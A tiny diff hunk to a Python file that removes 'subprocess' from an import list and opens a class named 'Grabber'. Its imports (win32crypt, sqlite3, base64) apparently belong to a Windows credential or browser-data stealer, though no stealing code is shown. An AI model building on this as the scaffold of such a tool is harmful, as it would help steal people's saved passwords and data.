@@ -1,4 +1,4 @@
-import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime, subprocess
+import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime
 
 class Grabber:
     def __init__(self):
